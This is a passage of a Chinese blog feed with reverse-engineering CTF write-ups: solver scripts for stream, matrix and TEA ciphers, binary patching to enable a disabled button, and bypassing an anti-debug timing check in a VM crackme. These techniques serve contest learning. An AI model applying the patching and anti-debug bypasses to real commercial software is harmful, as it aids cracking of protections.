class="symbol">\c</span>rypto.json</span><br></pre></td></tr></table></figure><p>一般解密游戏中的数据就是各种模型，flag也应该也是一个类似的模型文件，使用umodel打文件<strong>flag.uasset</strong>，再转化成png保存就好了。</p><p><img src="/2021/01/26/DJBCTF/image-20210126160135944-1611648556272.png" alt="image-20210126160135944"></p><h3 id="anniu"><a href="#anniu" class="headerlink" title="anniu"></a>anniu</h3><p>开始就知道要让灰色按钮可用，找了enablewindow函数，但是不行，然后这个是易语言写的程序和以往做的有点不一样。。找按钮事件又没找到？。。奇怪。</p><p>最后直接OD从开始跟踪程序创建窗口的过程。其实就是很多个子窗口叠加的。从创建flag按钮的creatwindowsex找到了端倪，我才知道可以创建窗口的时候让控件不可用。。</p><p>其中的WS_DISABLED从VS查到了是0x08000000，所以我把整个值改为0x44012F00即可。</p><p><img src="/2021/01/26/DJBCTF/image-20210125115444155-1611648561584.png" alt="image-20210125115444155"></p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>就一个数独游戏，开始判断是不是每列每行的数都各不相同，然后判断每4*4的单元是不是每个数各不相同，典型的数独特征。</p><p>直接找个在线求解一下即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[] = &#123;<span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">9</span>, </span><br><span class="line"><span class="number">14</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">6</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag[i]<span class="number">-1</span> &gt;= <span class="number">10</span>)</span><br><span class="line"><span class="built_in">putchar</span>(flag[i]<span class="number">-1</span>+<span class="number">87</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">putchar</span>(flag[i]<span class="number">-1</span>+<span class="number">48</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>应该类似主程序装载一个文件，然后关键函数都在那个.so文件，所以动态跟踪就好了，很简单，找到输入的地方后下个断点，一会就来到的一个比较函数，虽然去了符号，但还是能猜到就是类似strcmp()函数，输入和目标字符比较。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;整体感觉Re有点偏杂，有收获，主要是还拿了个杯子，hha。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>starctf2021</title>
    <link href="https://www.bxnop.cn/2021/01/17/starctf2021/"/>
    <id>https://www.bxnop.cn/2021/01/17/starctf2021/</id>
    <published>2021-01-17T03:58:05.000Z</published>
    <updated>2021-02-16T11:19:17.827Z</updated>
    
    <content type="html"><![CDATA[<p>做了3个Re，从中感觉自己python运用能力不行，其次对常见的一些算法性质不过关，之前把z3想成万能的了，这里有一个题因为z3找不到解我就以为无解。。当时就想不通了。最后发现大家那个题爆破来做的比较多。。其次就是在一个有限域求逆矩阵然后相乘就好了，也就是hill加密。大一还学过线性代数的。。</p><p>然后就是一个题写一个dfs脚本花了很多时间，对python3的读写文件“wb”与“w”模式没有了解，这次运用就暴露出了问题。。且这在python2与python3中也有区别。</p><p>最后多线程爆破确实是个好东西。搜索算法要好好学。。</p><p>队伍29名，加油。<a id="more"></a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h3><p>开始关键点都没找到，运行了一下程序从报错信息经过搜索知道了这是个rust写程序，且这个错误信息是编写的时候可以定义的，从这也顺藤摸瓜的知道了报错是因为没有flag文件。</p><p>程序首先读取flag文件取数据，经过加密后写入output文件。</p><p><img src="/2021/01/17/starctf2021/image-20210127134521754-1611759746138.png" alt="image-20210127134521754"></p><p>然后简单分析一下，逻辑什么的很清楚，按照一定的顺序对每一位进行异或加密，但是那个异或的值是随机的，通过前面的数据来初始化的数据流。是一种流密码，但这里想了很久但是不知道怎么逆，后面想到按照题目加密的顺序一位一位的穷举肯定可以，，但是工程量就有点大了。。</p><p>最后才想到了python脚本，花了点时间，也改了很多，还有就是这个存在多对一的情况，所以要搜索。。</p><p>其次开始怎么也跑不出来，后面调试才发现，程序每次读取的字符都加了回车（’\0xa’），这就导致长度增加，而加密是用到了长度的。。然后就是为什么呢？</p><p>最后大量尝试搜索才发现，因为我开始是往flag文件手动输入的，然后脚本里也是先读取flag文件，这就导致开始就多了和一个’\0xa’，而后在写入也是同样有‘\0xa’。其次python2的‘rb’与‘r’模式读取都是str类型，而python3的‘rb’是byte, ‘r’才是str类型。且python若是‘wb’写入那写入数据必须是byte类型，而python2就都可以。</p><p>这里执行程序，有3种办法：</p><ul><li>os.system(‘./a’) 这里建议使用这个。</li><li>使用Popen() <a href="https://blog.csdn.net/super_he_pi/article/details/99713374" target="_blank" rel="noopener">python 中subprocess.Popen(）详解</a></li><li>pexpect 如果有交互的话，推荐使用。</li></ul><p>10s就得到了结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">startTime = datetime.datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"output_flag"</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">enc = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">index = [<span class="number">4</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">25</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">17</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">20</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">43</span>]</span><br><span class="line">base = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_=-~!.@#%^&amp;*()"</span></span><br><span class="line">result = [<span class="string">'1'</span>]*<span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">45</span>:</span><br><span class="line">print(<span class="string">'find one:'</span> + <span class="string">''</span>.join(result))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> base:</span><br><span class="line">result[index[i]] = ch</span><br><span class="line">flag = <span class="string">''</span>.join(result)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(flag.encode())</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#r = pexpect.spawn('./a')</span></span><br><span class="line"><span class="comment">#r.wait()</span></span><br><span class="line">os.system(<span class="string">'./a'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">ans = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">if</span> ans[index[i]] == enc[index[i]]:</span><br><span class="line">    print(flag)</span><br><span class="line">    dfs(i+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line">endTime = datetime.datetime.now()</span><br><span class="line">print(<span class="string">"运行的时间是：%ss"</span> % (endTime - startTime).seconds)</span><br></pre></td></tr></table></figure><h3 id="ChineseGame"><a href="#ChineseGame" class="headerlink" title="ChineseGame"></a>ChineseGame</h3><p>读懂游戏怎么玩的后，手动弄了几个数据然后总结规律。</p><p>一个长度为10的链表，最后把所有的数据域都变成大于100。</p><p><img src="/2021/01/17/starctf2021/image-20210127135918158-1611759760723.png" alt="image-20210127135918158"></p><p>就是不断累加套上去就是了。</p><p>赛后看大家很多都是发现了只要那个数据域是0就像向上，1的话就向下，直接paython脚本，真是好。。。</p><h3 id="wherekey"><a href="#wherekey" class="headerlink" title="wherekey"></a>wherekey</h3><p>就是这个题因为z3没有解，以为我哪里弄错了郁闷半天，最后也没有把题目做出来。</p><p>由矩阵的乘法可知，这里算法实际就是用一个固定的5*5矩阵去乘flag组成的5*5矩阵，但是每次都mod了257，所以在一个有限域内。</p><p>然后其实可以爆破的，我看爆破的人也挺多的，hhha。。</p><p>这里我算了一下，如果常规写5个for循环爆破时间不会少的。。</p><p>但是用pwntools的多线程爆破，最多2个多小时就搞定了，也还是可以的。hhh。<a href="https://happi0.gitee.io/happi0/2020/12/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84python/#toc-heading-3" target="_blank" rel="noopener">Crypto常用工具</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> pwnlib</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">base = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_=-~!.@#%^&amp;*()"</span></span><br><span class="line">enc = [<span class="number">56</span>, <span class="number">109</span>,  <span class="number">75</span>,  <span class="number">75</span>, <span class="number">185</span>, <span class="number">138</span>, <span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>, </span><br><span class="line">  <span class="number">138</span>, <span class="number">154</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>, <span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>, </span><br><span class="line">  <span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]</span><br><span class="line">b = <span class="string">"flag&#123;are_you_sure_friend&#125;"</span></span><br><span class="line">b = list(map(ord, b))</span><br><span class="line">enc = enc[<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(a)</span>:</span></span><br><span class="line">a = list(map(ord, a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="comment">#a = list(map(ord, a)) 很无脑的错误，不能放在这里的原因:因为如果已经转换了一次了，那就已经是int型，下一次转换就出错了。</span></span><br><span class="line"><span class="keyword">if</span> ((a[<span class="number">0</span>]*b[i] + a[<span class="number">1</span>]*b[<span class="number">5</span>+i] + a[<span class="number">2</span>]*b[<span class="number">10</span>+i] + a[<span class="number">3</span>]*b[<span class="number">15</span>+i] + a[<span class="number">4</span>]*b[<span class="number">20</span>+i])%<span class="number">257</span>) != enc[i]:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">ans = mbruteforce(check, base, <span class="number">5</span>, method=<span class="string">'fixed'</span>)</span><br></pre></td></tr></table></figure><p>最后贴一下官方放的使用sage求解，也就是带余的矩阵乘法和逆矩阵。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A = Matrix(GF(<span class="number">257</span>),[[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>], [<span class="number">97</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">121</span>], [<span class="number">111</span>, <span class="number">117</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">117</span>], [<span class="number">114</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">102</span>, <span class="number">114</span>], [<span class="number">105</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">125</span>]])</span><br><span class="line"></span><br><span class="line">encode =  Matrix(GF(<span class="number">257</span>),[[<span class="number">56</span>, <span class="number">109</span>, <span class="number">75</span>,<span class="number">75</span>,<span class="number">185</span>], [<span class="number">138</span> ,<span class="number">249</span>, <span class="number">138</span>, <span class="number">187</span>,  <span class="number">92</span>],[<span class="number">138</span>, <span class="number">154</span> ,<span class="number">186</span>, <span class="number">107</span>, <span class="number">210</span>],[<span class="number">198</span>, <span class="number">187</span>,   <span class="number">5</span>, <span class="number">144</span>,  <span class="number">86</span>],[<span class="number">147</span>, <span class="number">230</span>,  <span class="number">18</span>, <span class="number">189</span>,  <span class="number">79</span>]])</span><br><span class="line"></span><br><span class="line">flag = encode*A.inverse()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>这个找个在线网站解一下就好：<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">sage在线求解</a></p><p><img src="/2021/01/17/starctf2021/image-20210127153009965-1611759765185.png" alt="image-20210127153009965"></p><h3 id="Favourite-Architecture-flag0"><a href="#Favourite-Architecture-flag0" class="headerlink" title="Favourite Architecture flag0"></a>Favourite Architecture flag0</h3><p>有ghidra9.2就很简单了，查查riscv相关的指令，实在不好理解的方式调试也行。</p><p>前半段流加密，只要最后得到最后的异或值就好了。后半段一个tea加密。</p><p>这里贴下tea吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> key[] = &#123;<span class="number">0xbb</span>, <span class="number">0xa0</span>, <span class="number">0x68</span>, <span class="number">0x13</span>, <span class="number">0x1e</span>, <span class="number">0xce</span>, <span class="number">0x0a</span>, <span class="number">0x19</span></span><br><span class="line">, <span class="number">0x57</span>, <span class="number">0xa3</span>, <span class="number">0xd8</span>, <span class="number">0x35</span>, <span class="number">0x61</span>, <span class="number">0x2c</span>, <span class="number">0xbf</span>, <span class="number">0x26</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> enc[] = &#123;<span class="number">0xf9</span>, <span class="number">0x87</span>, <span class="number">0x50</span>, <span class="number">0xc4</span>, <span class="number">0xb2</span>, <span class="number">0xf2</span>, <span class="number">0x03</span>, <span class="number">0x07</span></span><br><span class="line">, <span class="number">0x3c</span>, <span class="number">0xf4</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x59</span>, <span class="number">0xbb</span>, <span class="number">0xb4</span>, <span class="number">0xed</span></span><br><span class="line">, <span class="number">0x2a</span>, <span class="number">0xb0</span>, <span class="number">0xf0</span>, <span class="number">0x0f</span>, <span class="number">0xf2</span>, <span class="number">0x20</span>, <span class="number">0x85</span>, <span class="number">0x00</span></span><br><span class="line">, <span class="number">0xdd</span>, <span class="number">0x23</span>, <span class="number">0xcd</span>, <span class="number">0xfd</span>, <span class="number">0x75</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0x35</span></span><br><span class="line">, <span class="number">0xd3</span>, <span class="number">0xb6</span>, <span class="number">0xd7</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1b</span>, <span class="number">0xf2</span>, <span class="number">0x74</span></span><br><span class="line">, <span class="number">0x12</span>, <span class="number">0xbf</span>, <span class="number">0x2d</span>, <span class="number">0xcb</span>, <span class="number">0xf6</span>, <span class="number">0x53</span>, <span class="number">0xb4</span>, <span class="number">0xa4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//(*((unsigned int *)(enc+8*i)) &gt;&gt; 5)+*((unsigned int *)key+3)^delat+*((unsigned int *)(enc+8*i))*(*((unsigned int *)(enc+8*i)))^0x10+*((unsigned int *)key+2)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> delat = <span class="number">3816266640</span>;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>) -= (*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">3</span>)^delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))^(*((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">2</span>);</span><br><span class="line">*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))) -= (*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i)+<span class="number">1</span>)) &gt;&gt; <span class="number">5</span>) + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">1</span>)^delat+ *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>)^(*(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(enc+<span class="number">8</span>*i))+<span class="number">1</span>))*<span class="number">0x10</span> + *(((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)key)+<span class="number">0</span>);</span><br><span class="line">delat += <span class="number">0x61c88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做了3个Re，从中感觉自己python运用能力不行，其次对常见的一些算法性质不过关，之前把z3想成万能的了，这里有一个题因为z3找不到解我就以为无解。。当时就想不通了。最后发现大家那个题爆破来做的比较多。。其次就是在一个有限域求逆矩阵然后相乘就好了，也就是hill加密。大一还学过线性代数的。。&lt;/p&gt;
&lt;p&gt;然后就是一个题写一个dfs脚本花了很多时间，对python3的读写文件“wb”与“w”模式没有了解，这次运用就暴露出了问题。。且这在python2与python3中也有区别。&lt;/p&gt;
&lt;p&gt;最后多线程爆破确实是个好东西。搜索算法要好好学。。&lt;/p&gt;
&lt;p&gt;队伍29名，加油。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>第六届上海市大学生网络安全大赛</title>
    <link href="https://www.bxnop.cn/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2020-11-15T14:40:50.000Z</published>
    <updated>2021-01-27T15:07:48.577Z</updated>
    
    <content type="html"><![CDATA[<p>2个虚拟机类型的题目。当然，高兴的是进了线下，队伍最后第2名/。<a id="more"></a></p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/909254_NE362J9P4YSEMAR.png" alt="909254_NE362J9P4YSEMAR"></p><h3 id="真正的Babyre"><a href="#真正的Babyre" class="headerlink" title="真正的Babyre"></a>真正的Babyre</h3><p>ida开始直接搜索字符串，找到关键函数，简单修复一下栈指针，直接F5。</p><p>开始总感觉自己看到的是假的流程，把程序翻了个遍，没发现其它的流程，但是发现了几个反调试，但是调试发现程序都没有使用。。。其中二个：</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201115110658656-1605414968987.png" alt="image-20201115110658656"></p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201114231613090-1605451277739.png" alt="image-20201114231613090"></p><p>然后确定这就是一个虚拟机逆向。静态分析一下后直接让程序跑起来。</p><p>这里我做的时候和复现的时候，ida识别的竟然不一样，复现分析的更简洁。记得做的时候，每次赋值操作码与数据的时候是使用一个四字节数据来保存的，其中L0BYTE，Byte1，Byte2，HIByte都是不同的含义：</p><p>做的时候的一些笔记：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试flag。</span></span><br><span class="line">flag&#123;<span class="number">0123456789012345678901234567890</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最后比较的数据。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">31</span>,  <span class="number">24</span>,  <span class="number">15</span>, <span class="number">250</span>, <span class="number">184</span>,  <span class="number">99</span>, <span class="number">100</span>, <span class="number">137</span>,  <span class="number">24</span>, <span class="number">104</span>, </span><br><span class="line">  <span class="number">124</span>,  <span class="number">25</span>,  <span class="number">20</span>,  <span class="number">45</span>, <span class="number">125</span>,  <span class="number">88</span>,   <span class="number">0</span>,  <span class="number">30</span>,  <span class="number">84</span>, <span class="number">106</span>, </span><br><span class="line">   <span class="number">65</span>,  <span class="number">60</span>,  <span class="number">54</span>,  <span class="number">62</span>,  <span class="number">86</span>,  <span class="number">19</span>,   <span class="number">4</span>,  <span class="number">59</span>,  <span class="number">46</span>,  <span class="number">75</span>, </span><br><span class="line">  <span class="number">121</span>,  <span class="number">67</span>, <span class="number">122</span>,  <span class="number">34</span>,  <span class="number">69</span>, <span class="number">110</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">38</span>, <span class="number">200</span>, </span><br><span class="line">  <span class="number">192</span>, <span class="number">142</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOBYTE：%<span class="number">64</span> index</span><br><span class="line">BYTE2: 开始与LOBYTE值相同，做运算完的赋值index</span><br><span class="line">BYTE1: xor input[]  opcode: <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>：BYTE1 &amp;= LOBYTE;</span><br></pre></td></tr></table></figure><p>然后程序中使用了的一个反调试（时钟检测）：简单patch了即可。</p><p><img src="/2020/11/15/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20201115001246130-1605451277740.png" alt="image-20201115001246130"></p><p>乍一看程序流程有点复杂，感觉输入的数据会应该下一步操作码，这个其实就是一个加密操作。</p><p>总结一下程序的加密操作（对所有字符串的加密都是这个操作）：首先从操作码中取出一个数据<strong>op_data</strong> ，然后temp  = input[i]^op_data，再让op_data &amp;= input[i]，input[i] = temp，一直这个循环直到op_data == 0，最后取出input[i+1]进行input[i] ^= 